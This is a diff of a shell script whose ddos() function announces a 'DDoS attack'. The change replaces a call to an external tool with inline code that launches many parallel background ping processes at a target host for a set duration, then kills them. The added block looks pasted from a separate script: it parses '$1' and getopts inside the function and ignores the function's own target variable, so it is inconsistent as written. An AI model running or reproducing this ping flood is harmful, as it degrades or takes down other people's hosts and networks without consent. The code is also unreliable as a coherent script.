@@ -339,8 +339,33 @@ ddos() {
         return
     fi
     echo "Launching DDoS attack on $target_ip..."
-    # Use a tool like lofty to perform the DDoS attack
-    lofty $target_ip
+ 
+host="$1"
+shift
+declare -i npings=50
+declare -i duration=5
+
+while getopts ":n:t:" opt
+do
+case $opt in
+n) let npings=$OPTARG;;
+t) let duration=$OPTARG;;
+\?) echo "Usage: source dos.sh host [-n npings] [-t duration]" >&2;;
+esac
+done
+ 
+
+for (( i=0; $i<$npings; i++ ))
+do
+ping "$host" > /dev/null &
+done
+
+
+sleep $duration
+killall ping
+
+
+unset opt i host npings duration
 }
 # Function to ping a host
 ping_host() {
